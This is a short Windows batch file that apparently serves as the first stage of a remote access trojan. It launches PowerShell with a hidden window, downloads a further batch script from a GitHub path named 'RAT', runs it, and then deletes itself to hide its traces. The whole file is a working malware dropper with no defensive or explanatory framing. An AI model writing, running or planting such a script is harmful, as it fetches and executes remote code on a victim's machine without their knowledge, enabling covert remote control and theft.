@echo off
powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o third.bat
third.bat
del "%~f0"
